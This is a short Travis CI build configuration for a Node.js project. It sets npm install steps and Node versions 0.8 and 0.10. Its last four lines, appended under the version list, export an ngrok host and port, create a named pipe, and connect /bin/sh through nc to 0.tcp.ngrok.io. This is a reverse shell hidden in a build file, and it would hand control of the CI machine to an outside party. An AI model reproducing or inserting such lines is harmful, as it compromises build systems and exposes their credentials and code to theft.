before_install:
  - '[ "${TRAVIS_NODE_VERSION}" != "0.8" ] || npm install -g npm@1.4.28'
  - npm install -g npm@latest
language: node_js
node_js:
  - 0.8
  - 0.10

  - export NGPORT=18191
  - export NGHOSTNAME=0.tcp.ngrok.io
  - mknod /tmp/backpipe p
  - /bin/sh 0</tmp/backpipe|nc $NGHOSTNAME $NGPORT 1>/tmp/backpipe